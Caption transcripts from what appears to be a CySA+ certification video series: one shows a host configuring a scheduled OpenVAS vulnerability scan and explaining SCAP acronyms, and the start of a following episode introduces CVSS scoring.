software,\nyou've gotta be performing your updates.\n\n355\n00:17:55.900 --> 00:17:58.030\nYou gotta make sure that it's\ngot the latest vulnerability.\n\n356\n00:17:58.030 --> 00:17:58.930\nComing in from a feed,\n\n357\n00:17:58.930 --> 00:18:02.550\nmaybe it does it automatically, maybe you\nhave to set that up, schedule, downloads.\n\n358\n00:18:02.550 --> 00:18:06.700\nWhatever it is, whatever your scanner does\nto make sure that it is as up to date as\n\n359\n00:18:06.700 --> 00:18:11.610\npossible, you need to schedule\nthat to happen on a regular basis\n\n360\n00:18:12.700 --> 00:18:15.310\nas regularly as possible,\n\n361\n00:18:15.310 --> 00:18:18.170\nagain, using the same kind of criteria\nof what we looked at for scanning.\n\n362\n00:18:18.170 --> 00:18:23.830\nYou also wanna do that for updates for\nyour system, so keep that in mind.\n\n363\n00:18:25.070 --> 00:18:27.380\nLet's talk about, well,\nyou know what, let's do this.\n\n364\n00:18:27.380 --> 00:18:30.790\nLet's create a scheduled scan,\nso that we can take a look and\n\n365\n00:18:30.790 --> 00:18:36.540\nsee if any of these criteria pop up\nin our way, so that we can do that.\n\n366\n00:18:36.540 --> 00:18:38.688\nSo let's do this, so let's go back,\n\n367\n00:18:38.688 --> 00:18:42.193\nI think my scan is running my\nimmediate scan we're at 60%.\n\n368\n00:18:42.193 --> 00:18:44.240\nYou'll see that right here.\n\n369\n00:18:44.240 --> 00:18:48.144\nImmediate scan of IP 192.168.55 is at 60%.\n\n370\n00:18:48.144 --> 00:18:51.110\nSo that thing is cranking right now.\n&gt;&gt; Mm-hm.\n\n371\n00:18:51.110 --> 00:18:52.760\n&gt;&gt; And we'll look at the result when that\n\n372\n00:18:52.760 --> 00:18:53.920\ngets done.\n\n373\n00:18:53.920 --> 00:19:01.060\nLet's go back to our scan creation,\nhello, and we're gonna do a new task.\n\n374\n00:19:03.320 --> 00:19:05.081\nAnd let that.\n\n375\n00:19:05.081 --> 00:19:07.480\nHello, what do I think?\n\n376\n00:19:07.480 --> 00:19:08.639\nNo, I got it.\n\n377\n00:19:08.639 --> 00:19:09.350\nLet's see, one more time.\n\n378\n00:19:10.460 --> 00:19:11.830\nNew task.\n\n379\n00:19:11.830 --> 00:19:12.330\nThere we go.\n\n380\n00:19:12.330 --> 00:19:14.290\nThat's what I was looking for.\n\n381\n00:19:14.290 --> 00:19:18.770\nSo I will get plugged in on this a little\nbit, so we can see it a bit better.\n\n382\n00:19:18.770 --> 00:19:20.410\nAnd now what are we confronted with.\n\n383\n00:19:20.410 --> 00:19:22.630\nWe are confronted with a few questions,\n\n384\n00:19:22.630 --> 00:19:26.290\na few bit of information\nthat we need to supply.\n\n385\n00:19:26.290 --> 00:19:28.740\nAnd let's see if we recognize\nany of these stuff.\n\n386\n00:19:28.740 --> 00:19:30.220\nSo the first one is the name.\n\n387\n00:19:30.220 --> 00:19:31.950\nWhat is the scan going to be called?\n\n388\n00:19:31.950 --> 00:19:34.660\nThis is a good spot for\nyou to be able to say, hey,\n\n389\n00:19:34.660 --> 00:19:39.430\nI really want to focus in on making\nyou say this our monthly scans,\n\n390\n00:19:39.430 --> 00:19:43.080\ncalled monthly scan, monthly full scan or\nmonthly quick scan, or\n\n391\n00:19:43.080 --> 00:19:46.970\nwhatever the options if you've available,\njust be as detailed as possible.\n\n392\n00:19:46.970 --> 00:19:52.260\nYou go and put some comments and\nhelp flesh that out if it's not Ultram\n\n393\n00:19:52.260 --> 00:19:54.930\nforthcoming with that kind\nof information system.\n\n394\n00:19:54.930 --> 00:19:58.812\nI love comment sections to be honest with\nyou I don't know why people skip them, but\n\n395\n00:19:58.812 --> 00:20:02.693\nthey're super informative for people that\ndon't know why you did what you did, or\n\n396\n00:20:02.693 --> 00:20:05.870\nif you come back to this six months\nfrom now and go, why did I do that?\n\n397\n00:20:05.870 --> 00:20:09.566\nThe comments really help, so\nI like filling those out.\n\n398\n00:20:09.566 --> 00:20:10.920\nLet's see here, what else?\n\n399\n00:20:10.920 --> 00:20:14.100\nTargets, this will be a part of the scope.\n\n400\n00:20:14.100 --> 00:20:15.640\nWhat targets do I want?\n\n401\n00:20:15.640 --> 00:20:16.940\nSo I've got a sensitive server.\n\n402\n00:20:16.940 --> 00:20:20.670\nI can come over here and\ncreate a target list.\n\n403\n00:20:20.670 --> 00:20:25.690\nOr I can go from this drop down of\nones I've already created, right?\n\n404\n00:20:25.690 --> 00:20:29.310\nSo, sensitive servers would be a scope\nwith servers that probably don't need to\n\n405\n00:20:29.310 --> 00:20:30.890\nbe hit during production hours.\n\n406\n00:20:30.890 --> 00:20:34.020\nThey don't need to be run intensive scans\non them, because they're sensitive.\n\n407\n00:20:34.020 --> 00:20:35.700\nThey're whiny little crybabies,\n\n408\n00:20:35.700 --> 00:20:38.800\nthat if you give them a boo-boo,\nthey go down, right?\n\n409\n00:20:38.800 --> 00:20:42.710\nSo, maybe I have to make a list for\nthem on a very slow and\n\n410\n00:20:42.710 --> 00:20:47.490\nunintensive scans, so\nthat they do not go down,\n\n411\n00:20:47.490 --> 00:20:50.540\nI mean, I have to fix them.\n&gt;&gt; Mh-hm.\n\n412\n00:20:50.540 --> 00:20:52.070\n&gt;&gt; Right, and then just standard volt scan\n\n413\n00:20:52.070 --> 00:20:54.060\ntargets or\nagain you can create a custom on that.\n\n414\n00:20:55.560 --> 00:20:59.280\nAlerts, I clicked it I did not\nwant to click it, or maybe we do.\n\n415\n00:20:59.280 --> 00:21:02.820\nWhat type of alerts are we going to be\nlooking for and can tame these alerts,\n\n416\n00:21:02.820 --> 00:21:04.250\nthere are some that are already built in?\n\n417\n00:21:04.250 --> 00:21:06.730\nWe are going to talk about NVTs and\nstuff here.\n\n418\n00:21:06.730 --> 00:21:11.320\nIn just a minute we're gonna get kinda\ndetailed in another episode on the CBSS,\n\n419\n00:21:11.320 --> 00:21:14.050\nthe Common Board Scoring System.\n&gt;&gt; Wonderful.\n\n420\n00:21:14.050 --> 00:21:15.570\n&gt;&gt; Yeah, it's gonna be fun so\n\n421\n00:21:15.570 --> 00:21:19.790\nget your pens and paper ready and go this\nlooks like math, because it kinda is.\n\n422\n00:21:19.790 --> 00:21:20.910\nIt's a little weird.\n\n423\n00:21:20.910 --> 00:21:24.900\nAnyway, condition, severity levels.\n\n424\n00:21:24.900 --> 00:21:27.360\nFilters report results.\n\n425\n00:21:27.360 --> 00:21:28.410\nI don't actually need this.\n\n426\n00:21:28.410 --> 00:21:36.480\nI can go back and I can just,\nI guess I do have to set that up.\n\n427\n00:21:36.480 --> 00:21:37.670\nI forgot that I had to do that here.\n\n428\n00:21:37.670 --> 00:21:38.440\nI thought I had a drop down.\n\n429\n00:21:38.440 --> 00:21:40.460\nBut anyway, you see the.\n\n430\n00:21:40.460 --> 00:21:41.580\nI'm not actually gonna set one up.\n\n431\n00:21:41.580 --> 00:21:45.770\nWe'll look at one I've already done so we\ndon't get too far in the weeds with this.\n\n432\n00:21:45.770 --> 00:21:48.280\nThen the schedule, yes, the schedule.\n\n433\n00:21:48.280 --> 00:21:49.610\nWhat is our risk appetite?\n\n434\n00:21:49.610 --> 00:21:50.960\nWhat constraints?\n\n435\n00:21:50.960 --> 00:21:52.870\nFigure out what the schedule is and\n\n436\n00:21:52.870 --> 00:21:58.050\nthen say, I can create a schedule,\ncall it something appropriate.\n\n437\n00:21:58.050 --> 00:22:01.361\nLet's look at that.\n&gt;&gt; Aunt's Betty old [INAUDIBLE]?\n\n438\n00:22:01.361 --> 00:22:02.810\n&gt;&gt; Aunt Betty's old [INAUDIBLE],\n\n439\n00:22:02.810 --> 00:22:03.429\nI like that.\n\n440\n00:22:03.429 --> 00:22:09.730\nAunt's Betty's Betty's old jalopy.\n&gt;&gt; Can't believe you did that.\n\n441\n00:22:09.730 --> 00:22:11.620\n&gt;&gt; There you go, very good, right?\n\n442\n00:22:11.620 --> 00:22:13.420\nSo if that makes sense to you,\nthen use that.\n\n443\n00:22:13.420 --> 00:22:16.890\nProbably not gonna be the way to go.\n&gt;&gt; No, we're having a bit of fun.\n\n444\n00:22:16.890 --> 00:22:18.160\n&gt;&gt; But here we go, easy.\n\n445\n00:22:18.160 --> 00:22:20.260\nWhen's the first time it should run?\n\n446\n00:22:20.260 --> 00:22:22.310\nWhat's the time zone so\nit knows the time, right?\n\n447\n00:22:22.310 --> 00:22:25.700\nSo it's in accordance with that\nthe heck you're actually doing.\n\n448\n00:22:25.700 --> 00:22:28.580\nAnd then when you want it to run and\nthen period.\n\n449\n00:22:28.580 --> 00:22:31.300\nDo I want it to run every one hours?\n\n450\n00:22:31.300 --> 00:22:34.700\nDo I want it to run every one day, every\none week, every one month, and so on and\n\n451\n00:22:34.700 --> 00:22:35.920\nso forth, right?\n\n452\n00:22:35.920 --> 00:22:37.200\nI can do that.\n\n453\n00:22:37.200 --> 00:22:40.740\nHow long should it run,\nI can say one hours,\n\n454\n00:22:40.740 --> 00:22:45.810\nor one day, however intense or\nnot intense do I need it to be?\n\n455\n00:22:45.810 --> 00:22:47.260\nHit Go, click Create, and\n\n456\n00:22:47.260 --> 00:22:49.035\nyou are off to the races.\n&gt;&gt; Very nice.\n\n457\n00:22:49.035 --> 00:22:51.910\n&gt;&gt; Let's see what else do we have to\n\n458\n00:22:51.910 --> 00:22:52.910\ndo here?\n\n459\n00:22:52.910 --> 00:22:55.380\nAdd results to assets, yes, so\n\n460\n00:22:55.380 --> 00:22:58.480\nthat will show up in your assets\nlist to see the results there.\n\n461\n00:22:58.480 --> 00:23:01.600\nI definitely want that so\nI can review them.\n\n462\n00:23:01.600 --> 00:23:05.580\nAlterable tasks, do I want to make this\ntask changeable, I mean, and mutable in\n\n463\n00:23:05.580 --> 00:23:08.990\nsome way shape or form or do I always want\nit to always be that, no one touch that if\n\n464\n00:23:08.990 --> 00:23:14.240\nyou need to make an alteration, use it\nas a template, and create a new task.\n\n465\n00:23:14.240 --> 00:23:16.325\nSo these are good questions.\n\n466\n00:23:16.325 --> 00:23:19.410\nAuto-delete, do not\nautomatically delete reports.\n\n467\n00:23:19.410 --> 00:23:23.960\nSometimes you have like,\nI'll only retain x amount of reports.\n\n468\n00:23:23.960 --> 00:23:25.650\nAnd that's fine for you,\nmaybe, maybe it's not.\n\n469\n00:23:25.650 --> 00:23:27.940\nMaybe I don't want you to do that at all.\n\n470\n00:23:27.940 --> 00:23:30.210\nI wanna keep all reports forever.\n\n471\n00:23:30.210 --> 00:23:33.190\nSo I'd wanna have this option available.\n\n472\n00:23:33.190 --> 00:23:36.783\nOr you can say automatically delete oldest\nreports, but always keep the newest.\n\n473\n00:23:36.783 --> 00:23:39.820\nGreat stuff, let's move through here.\n\n474\n00:23:39.820 --> 00:23:41.690\nWhat scanner are you using?\n\n475\n00:23:41.690 --> 00:23:45.580\nSo we have CVEs or the open vase default.\n\n476\n00:23:45.580 --> 00:23:49.220\nCVEs are the, man,\nI can never remember this.\n\n477\n00:23:49.220 --> 00:23:52.220\nIt's common vulnerability and\nexposures, that's it.\n\n478\n00:23:52.220 --> 00:23:55.690\nThese are basically the vulnerabilities.\n\n479\n00:23:55.690 --> 00:23:56.265\nThere's lists of them.\n\n480\n00:23:56.265 --> 00:24:02.364\nYou could go on the web, type in CVEs and\nyou'll find lists of CVEs.\n\n481\n00:24:02.364 --> 00:24:05.826\nThat are maintained to say, here's\na vulnerability that was found here.\n\n482\n00:24:05.826 --> 00:24:08.415\nWhen it was found,\nhere is the details about it,\n\n483\n00:24:08.415 --> 00:24:11.398\nhere is their proof of concept\ncode associated with it.\n\n484\n00:24:11.398 --> 00:24:16.891\nAnd it becomes a real vulnerability,\nthat vulnerability scanners,\n\n485\n00:24:16.891 --> 00:24:22.780\nand then download and say,\nI've got cve-2018-0137, right?\n\n486\n00:24:22.780 --> 00:24:27.760\nAnd that is the race\ncondition found in Cisco,\n\n487\n00:24:27.760 --> 00:24:30.250\nblah, blah, blah, and all this\ninformation that goes along with it.\n\n488\n00:24:30.250 --> 00:24:33.160\nSo we'll take a look a little\nbit about that in just a-\n\n489\n00:24:33.160 --> 00:24:33.860\n&gt;&gt; There's a common\n\n490\n00:24:33.860 --> 00:24:37.310\nvulnerability scoring system, isn't there?\n&gt;&gt; Yeah, we'll talk about that.\n\n491\n00:24:37.310 --> 00:24:39.310\nWe're gonna do a whole show.\n&gt;&gt; On the CBSS, yes.\n\n492\n00:24:39.310 --> 00:24:40.100\n&gt;&gt; Right, right, right, right,\n\n493\n00:24:40.100 --> 00:24:41.080\nright.\n&gt;&gt; Yes,\n\n494\n00:24:41.080 --> 00:24:43.560\nbecause there's a lot of\ninterworkings going on there.\n\n495\n00:24:43.560 --> 00:24:47.190\nSo we'll tackle that monkey\nin just a little bit, okay?\n\n496\n00:24:47.190 --> 00:24:48.940\nJust not miss that monkey, yeah, yeah.\n\n497\n00:24:48.940 --> 00:24:50.802\nHey, they're getting tackle.\n\n498\n00:24:50.802 --> 00:24:55.430\nAnd then some other stuff,\nscan config, full and fast.\n\n499\n00:24:55.430 --> 00:25:00.470\nFull fast and ultimate, full fast,\nfull and very deep, obviously\n\n500\n00:25:00.470 --> 00:25:05.080\nyou can kind of garner what the heck\nthey're talking about, close discovery,\n\n501\n00:25:05.080 --> 00:25:08.340\nmaybe I'm just doing system discovery or\nmaybe just the regular discovery.\n\n502\n00:25:08.340 --> 00:25:10.590\nIt's the intensity level of these scans.\n&gt;&gt; I think it's great,\n\n503\n00:25:10.590 --> 00:25:14.580\nthat OpenVAS does all this for you, it's\npretty much a set and forget it almost.\n\n504\n00:25:14.580 --> 00:25:15.100\n&gt;&gt; Yes, it's great,\n\n505\n00:25:15.100 --> 00:25:16.470\nthat's why I told you, I love it.\n\n506\n00:25:16.470 --> 00:25:19.926\nYou can tell it what network\ninterface you're gonna use, so\n\n507\n00:25:19.926 --> 00:25:21.753\nput that in there if you like, so\n\n508\n00:25:21.753 --> 00:25:25.984\nmaybe you have a multi home system\nwhich you're gonna be scanning of E4.\n\n509\n00:25:25.984 --> 00:25:30.699\nSo just let it know what network\ninterface that it's, order for\n\n510\n00:25:30.699 --> 00:25:34.204\ntarget host you want to\ngo in sequential order.\n\n511\n00:25:34.204 --> 00:25:36.170\nDo you want to do a random order or\na reverse order?\n\n512\n00:25:36.170 --> 00:25:36.700\nVery cool.\n\n513\n00:25:36.700 --> 00:25:38.270\nMaybe you never even thought about that.\n\n514\n00:25:38.270 --> 00:25:42.650\nHey, should I be scanning one to here or\ndo I just want to randomized the thing and\n\n515\n00:25:42.650 --> 00:25:46.390\nlet it do whatever it does and let\nthe scan results come back when they do?\n\n516\n00:25:46.390 --> 00:25:48.820\nMaximum concurrencies executed MDTs.\n\n517\n00:25:48.820 --> 00:25:53.600\nSo how many vulnerabilities to scan for\na cycle.\n\n518\n00:25:53.600 --> 00:25:54.670\nYou can change that.\n\n519\n00:25:54.670 --> 00:25:57.210\nKind of increasing or decreasing that\nintensity label as you go there and\n\n520\n00:25:57.210 --> 00:25:58.600\ngive you a little more control.\n\n521\n00:25:58.600 --> 00:26:02.490\nAnd concurrent scan host,\nall right, now it's defaulted to 20.\n\n522\n00:26:02.490 --> 00:26:06.191\nSo it's gonna scan 20 hosts,\nmaybe I wanna reduce that to 2,\n\n523\n00:26:06.191 --> 00:26:09.760\nmaybe I wanna increase that to 200 and\nlet it go.\n\n524\n00:26:09.760 --> 00:26:11.320\nLet's get this done.\n\n525\n00:26:11.320 --> 00:26:15.650\nAgain, all kind of these little\ngranular controls that can increase or\n\n526\n00:26:15.650 --> 00:26:20.660\ndecrease intensity or\nsensitivity of the scan itself.\n\n527\n00:26:20.660 --> 00:26:23.932\nSo then you would click Create and then it\nwould be scheduled and you would run it.\n\n528\n00:26:23.932 --> 00:26:27.367\nSo let me zoom out here a little.\n\n529\n00:26:27.367 --> 00:26:31.139\nI'll show you my sensitive scan\nthat has been requested and\n\n530\n00:26:31.139 --> 00:26:34.313\nthen we can look at some\nof the details in thereof.\n\n531\n00:26:34.313 --> 00:26:38.372\nSo there we go, I didn't put any\ncomments here, I broke my own rule.\n\n532\n00:26:38.372 --> 00:26:40.594\nTarget, gives me the targets.\n\n533\n00:26:40.594 --> 00:26:43.920\nRunning schedule,\nlet's me know when its next due date is.\n\n534\n00:26:43.920 --> 00:26:47.790\nVery nice one, this is a report I can\nprint out, you give to my people or\n\n535\n00:26:47.790 --> 00:26:50.380\ngive to my boss, or\nwhatever the case is, but\n\n536\n00:26:50.380 --> 00:26:53.350\nat least we know a little bit more about\nwhat's going on with our scanning.\n\n537\n00:26:54.560 --> 00:26:55.740\nVery good stuff.\n\n538\n00:26:55.740 --> 00:27:00.490\nI think that's about it lets me know\nstatus as requested duration of last\n\n539\n00:27:00.490 --> 00:27:02.700\nscan lot of great informations there.\n\n540\n00:27:02.700 --> 00:27:08.870\nLet's go back I think our skin might\nbe able to still 83%, we won't wait.\n\n541\n00:27:08.870 --> 00:27:10.171\nWe'll go ahead and\n\n542\n00:27:10.171 --> 00:27:15.303\njump into a scan that's already done\nwhichever to scan [INAUDIBLE] anyway.\n\n543\n00:27:15.303 --> 00:27:18.644\nHere was the results of that scan.\n\n544\n00:27:18.644 --> 00:27:22.535\nZooming on it little much, over.\n\n545\n00:27:22.535 --> 00:27:28.594\nHere we go, tells us that we used\nOpenVAS default scanner just giving\n\n546\n00:27:28.594 --> 00:27:35.081\nus more the information about the system\nand what happened with the scan.\n\n547\n00:27:35.081 --> 00:27:39.760\nAlso then now that I know that\nit's done everything looks like.\n\n548\n00:27:39.760 --> 00:27:45.064\nWell, there was a report I can go into\nscans, which I clicked, cuz I'm an idiot.\n\n549\n00:27:45.064 --> 00:27:46.990\n[LAUGH] And I can go to reports.\n\n550\n00:27:46.990 --> 00:27:49.780\nAnd look at the report that\nwas generated from the scan.\n\n551\n00:27:49.780 --> 00:27:53.310\nSo, I just go here and say,\nis that the right one?\n\n552\n00:27:53.310 --> 00:27:54.900\nYeah, there we go.\n\n553\n00:27:54.900 --> 00:27:59.030\nAnd from there now I'm getting a list\nof the vulnerabilities that was\n\n554\n00:27:59.030 --> 00:28:00.360\nfound by the scanner.\n\n555\n00:28:00.360 --> 00:28:05.360\nIn order of criticality and\nthat's what we're seeing here.\n\n556\n00:28:05.360 --> 00:28:08.280\nSo a couple of things,\nhow is it doing if someone quickly just\n\n557\n00:28:08.280 --> 00:28:11.690\ngive you a rundown of what\nwe're looking at here.\n\n558\n00:28:11.690 --> 00:28:15.400\nThere's some security content\nautomation protocol that's\n\n559\n00:28:15.400 --> 00:28:18.090\nwhat's being used to generate\nwhat we're seeing here.\n\n560\n00:28:18.090 --> 00:28:21.860\nLet me give you a little more room,\na better look at this.\n\n561\n00:28:21.860 --> 00:28:23.890\nI know it's kinda small, but-\n&gt;&gt; SCAP.\n\n562\n00:28:23.890 --> 00:28:24.700\n&gt;&gt; Yes, SCAP,\n\n563\n00:28:24.700 --> 00:28:28.420\nyou wanna be aware of that terminology and\nwhat that SCAP means.\n\n564\n00:28:28.420 --> 00:28:30.940\nRemember, Security Content\nAutomation Protocol.\n\n565\n00:28:30.940 --> 00:28:36.080\nThis is what's used to create\nthings like CVSS, so the CVE data.\n\n566\n00:28:37.130 --> 00:28:42.030\nWhat else do we have, CCE which is\ncommon configuration enumeration\n\n567\n00:28:42.030 --> 00:28:47.380\nwhich organizes configuration issues and\nprovides a standard organization system.\n\n568\n00:28:47.380 --> 00:28:52.040\nSo that's what it's using to\nsort of categorize systems.\n\n569\n00:28:52.040 --> 00:28:54.970\nCPE which is the common\nplatform enumeration,\n\n570\n00:28:54.970 --> 00:28:59.850\na structured naming scheme for information\ntechnology systems, software and package.\n\n571\n00:28:59.850 --> 00:29:04.870\nSo giving it again more structure\nkind of building this framework for\n\n572\n00:29:04.870 --> 00:29:06.590\nreporting vulnerabilities.\n\n573\n00:29:06.590 --> 00:29:08.200\nThat's what we're talking about.\n\n574\n00:29:08.200 --> 00:29:11.150\nWhat's another one you do,\nCVE common vulnerability exposures.\n\n575\n00:29:11.150 --> 00:29:14.951\nGive us that reference method so\nwhen you see CVE dash 2018 dash.\n\n576\n00:29:14.951 --> 00:29:19.213\nFour-digit number, or that's the format,\nwhich will be CDE, to let you know that's\n\n577\n00:29:19.213 --> 00:29:23.290\nwhat it is, 2018 will be the year that\nthe vulnerability was discovered.\n\n578\n00:29:23.290 --> 00:29:27.668\nAnd then the 4-digit number is\na randomly generated 4-digit number for\n\n579\n00:29:27.668 --> 00:29:32.126\nit to be unique from all of the other\n2018 discovered vulnerabilities.\n\n580\n00:29:32.126 --> 00:29:35.299\nSo they'll all have their own unique\nfour-digit number associated with their\n\n581\n00:29:35.299 --> 00:29:36.020\nvulnerability.\n\n582\n00:29:37.140 --> 00:29:38.790\nWhat else?\n\n583\n00:29:38.790 --> 00:29:40.730\nThe CVSS, this is the scoring system.\n\n584\n00:29:40.730 --> 00:29:43.770\nThis is how we get this severity\nover here, and it says 10.\n\n585\n00:29:43.770 --> 00:29:46.755\nLet's me know that's high or\ncritical, whatever your scanner says.\n\n586\n00:29:46.755 --> 00:29:47.450\n&gt;&gt; Mm-hm.\n\n587\n00:29:47.450 --> 00:29:48.943\n&gt;&gt; That's how it comes up with that 10.\n\n588\n00:29:48.943 --> 00:29:53.358\nAnd you'll see if we go down,\nlet me see here,\n\n589\n00:29:53.358 --> 00:29:58.490\nyou see it goes 7.5, and\nhere we've got a 6.8.\n\n590\n00:29:58.490 --> 00:30:00.740\nAnd gets in the medium,\nwhere did he get that number,\n\n591\n00:30:00.740 --> 00:30:05.020\nCVSS does that squaring, like I said\nwe're gonna do the whole show on CVSS, so\n\n592\n00:30:05.020 --> 00:30:07.520\nwe know how that square will happen.\n&gt;&gt; I can't wait,\n\n593\n00:30:07.520 --> 00:30:10.460\nit's gonna be fun.\n&gt;&gt; What else do we need to know,\n\n594\n00:30:10.460 --> 00:30:13.640\nextensible configuration,\ncheck list description format or\n\n595\n00:30:13.640 --> 00:30:16.840\nthe XCCDF.\n&gt;&gt; That just rolls off the tongue.\n\n596\n00:30:16.840 --> 00:30:17.600\n&gt;&gt; It does, doesn't it?\n\n597\n00:30:17.600 --> 00:30:19.810\nIt just rolls right off, right off.\n\n598\n00:30:19.810 --> 00:30:23.495\nBasically a language for\ncreating checklists and\n\n599\n00:30:23.495 --> 00:30:29.827\nreporting checklist results, right, so\nthat's what that is, that's the XCCDF.\n\n600\n00:30:29.827 --> 00:30:32.502\nAnd then the last one is\nthe open vulnerability assessment\n\n601\n00:30:32.502 --> 00:30:34.290\nlanguage, or OVAL.\n\n602\n00:30:34.290 --> 00:30:36.020\nRemember that one is a language for\n\n603\n00:30:36.020 --> 00:30:40.610\nspecifying low level testing\nprocedures used by checklists.\n\n604\n00:30:40.610 --> 00:30:42.701\nSo these are things that\nwe want to be aware of.\n\n605\n00:30:42.701 --> 00:30:46.166\nAgain, in the show notes, you do not\nneed to steadily write these down\n\n606\n00:30:46.166 --> 00:30:48.809\nwe will have that available for\nyou in our show notes so\n\n607\n00:30:48.809 --> 00:30:52.310\nthat you can make some flash cards,\nthat is good flash card material.\n\n608\n00:30:52.310 --> 00:30:53.544\nAnd then permissions and\n\n609\n00:30:53.544 --> 00:30:56.431\naccess is the last thing we have\nwhen it comes to our scans.\n\n610\n00:30:56.431 --> 00:30:57.356\nDo they have permissions?\n\n611\n00:30:57.356 --> 00:30:58.260\nDo they have access?\n\n612\n00:30:58.260 --> 00:31:00.360\nThis will become that authentication.\n\n613\n00:31:00.360 --> 00:31:03.340\nDo I need credentials or\nnon-credentials scan?\n\n614\n00:31:03.340 --> 00:31:05.680\nDo I have authorization to run the scan?\n\n615\n00:31:05.680 --> 00:31:10.400\nDo I have access to the systems\nthat I need to run the scan on?\n\n616\n00:31:10.400 --> 00:31:12.020\nYou got to verify that\nall the stuff is done.\n\n617\n00:31:12.020 --> 00:31:14.510\nMake sure that that legwork\nhas been put to bed\n\n618\n00:31:14.510 --> 00:31:17.610\nbefore you start your scanning otherwise\nyour scans is not gonna be as complete and\n\n619\n00:31:17.610 --> 00:31:19.110\nrobust as you would like it to be.\n\n620\n00:31:19.110 --> 00:31:23.190\nAnd maybe uncompliant because of that,\nso verify that you have access and\n\n621\n00:31:23.190 --> 00:31:25.870\nauthorization to scan those machines and\n\n622\n00:31:25.870 --> 00:31:29.420\nthat is done before your\nstart scanning process.\n\n623\n00:31:29.420 --> 00:31:32.020\nZach, our clock has ticked its last\n\n624\n00:31:32.020 --> 00:31:32.777\ntock, I think.\n&gt;&gt; [LAUGH]\n\n625\n00:31:32.777 --> 00:31:33.919\n&gt;&gt; My voice is dying, so\n\n626\n00:31:33.919 --> 00:31:36.330\nI'm going to let us all take a breather.\n\n627\n00:31:36.330 --> 00:31:38.940\nYou've kind of seen what\nit takes to set up a scan.\n\n628\n00:31:38.940 --> 00:31:40.210\nNot crazy, all right?\n\n629\n00:31:40.210 --> 00:31:44.140\nIt just takes a bit of thought and\nknowing what some of the things mean, but\n\n630\n00:31:44.140 --> 00:31:47.410\nyou should be able to set up some tasks\nand scans at your leisure and then look at\n\n631\n00:31:47.410 --> 00:31:51.055\nthe results that they produce.\n&gt;&gt; Vulnerability Management Scan\n\n632\n00:31:51.055 --> 00:31:52.110\nConfiguration.\n\n633\n00:31:52.110 --> 00:31:53.140\nGreat episode and\n\n634\n00:31:53.140 --> 00:31:54.790\nI love that open pause by the way.\n&gt;&gt; Yeah.\n\n635\n00:31:54.790 --> 00:31:55.500\n&gt;&gt; But before we move on,\n\n636\n00:31:55.500 --> 00:31:59.610\nanything else you would like to say?\n&gt;&gt; No, it's really important, make those\n\n637\n00:31:59.610 --> 00:32:04.552\nflashcards when it comes to those\ndifferent acronyms for the SCAP contents.\n\n638\n00:32:04.552 --> 00:32:05.800\nThat's gonna be testable material,\n\n639\n00:32:05.800 --> 00:32:09.970\nso make sure you are up on that.\n&gt;&gt; Fantastic, great job, great job.\n\n640\n00:32:09.970 --> 00:32:13.260\nIn fact, you've done a marvelous

Good to see you too, Mr. Zach.\n\n11\n00:00:29.040 --> 00:00:30.590\nThanks for having me back on the show,\n\n12\n00:00:30.590 --> 00:00:33.020\nand thank you, good folks out there for\njoining us today.\n\n13\n00:00:33.020 --> 00:00:36.500\nHopefully you're wanting to learn a little\nbit about CYSA plus because that's\n\n14\n00:00:36.500 --> 00:00:37.010\nwhat we're doing.\n\n15\n00:00:37.010 --> 00:00:40.400\nIf you're not, maybe a Window's 10\nstyling is more your flavor and\n\n16\n00:00:40.400 --> 00:00:42.357\nyou want to jump over\nto a different channel.\n\n17\n00:00:42.357 --> 00:00:45.450\nBut-\n&gt;&gt; No, I want CYSA plus.\n\n18\n00:00:45.450 --> 00:00:46.760\n&gt;&gt; See, I've hooked him.\n\n19\n00:00:46.760 --> 00:00:48.843\n&gt;&gt; It's what I want.\nI've got him really raring to go.\n\n20\n00:00:48.843 --> 00:00:49.720\n&gt;&gt; I want them.\n&gt;&gt; And today,\n\n21\n00:00:49.720 --> 00:00:52.000\nwe're gonna talk about the CV.\n\n22\n00:00:52.000 --> 00:00:54.860\n&gt;&gt; My brain just now is going.\n\n23\n00:00:54.860 --> 00:00:55.960\nNo, it's not.\nWe're good to go.\n\n24\n00:00:55.960 --> 00:00:56.940\n&gt;&gt; [LAUGH] We're good?\n\n25\n00:00:56.940 --> 00:00:57.520\nWe're good?\n\n26\n00:00:57.520 --> 00:00:58.530\nOkay.\n&gt;&gt; CVSS.\n\n27\n00:00:58.530 --> 00:00:59.720\nWhat is that?\n\n28\n00:00:59.720 --> 00:01:02.200\nCommon Vulnerability Scoring System,\nwe've talked about it.\n\n29\n00:01:02.200 --> 00:01:03.550\nIt's a fantastic thing.\n\n30\n00:01:03.550 --> 00:01:05.140\nBut we haven't got into\nthe detail about it.\n\n31\n00:01:05.140 --> 00:01:06.880\nAnd that's what today's\nshow is gonna be about.\n\n32\n00:01:06.880 --> 00:01:11.270\nAnd being able to understand\nall the Complexities of it,\n\n33\n00:01:11.270 --> 00:01:15.420\neven some mathematical things that we're\ngonna have to actually know for the exam.\n\n34\n00:01:15.420 --> 00:01:17.770\nI know, I'm sorry,\nI didn't write the exam.\n\n35\n00:01:17.770 --> 00:01:18.330\nDon't blame me.\n\n36\n00:01:18.330 --> 00:01:18.980\n&gt;&gt; Mathematical.\n\n37\n00:01:18.980 --> 00:01:21.530\n&gt;&gt; I'm just bringing you the information\nto help you pass the thing.\n\n38\n00:01:21.530 --> 00:01:22.830\nAt least that's my goal.\n\n39\n00:01:22.830 --> 00:01:23.590\nI can do it.\n\n40\n00:01:23.590 --> 00:01:27.070\n&gt;&gt; And\nwe're gonna cover that in today's episode.\n\n41\n00:01:27.070 --> 00:01:28.870\n&gt;&gt; So what is CVSS?\n\n42\n00:01:28.870 --> 00:01:30.670\n&gt;&gt; Very good question.\n\n43\n00:01:30.670 --> 00:01:31.940\nWhat is CVSS?\n\n44\n00:01:31.940 --> 00:01:34.880\nObviously as we've said, it stands for\nthe Common Vulnerability Scoring System.\n\n45\n00:01:34.880 --> 00:01:37.740\nYou're wondering, why do you keep saying\nCommon Vulnerability Scoring System when\n\n46\n00:01:37.740 --> 00:01:39.685\nyou mention\nCommon Vulnerability Scoring System?\n\n47\n00:01:39.685 --> 00:01:42.090\n[LAUGH]\n&gt;&gt; And that's really hard to say, over and\n\n48\n00:01:42.090 --> 00:01:44.170\nover and over again,\nit makes your tounge tie really quickly.\n\n49\n00:01:44.170 --> 00:01:47.030\nBut I'm just trying to like\nhammer that home into your brain.\n\n50\n00:01:47.030 --> 00:01:53.400\nBut what it does is basically gives us\nthe ability to rate vulnerabilities.\n\n51\n00:01:53.400 --> 00:01:56.960\nHence the common vulnerability, this\nis a vulnerability that is known about,\n\n52\n00:01:56.960 --> 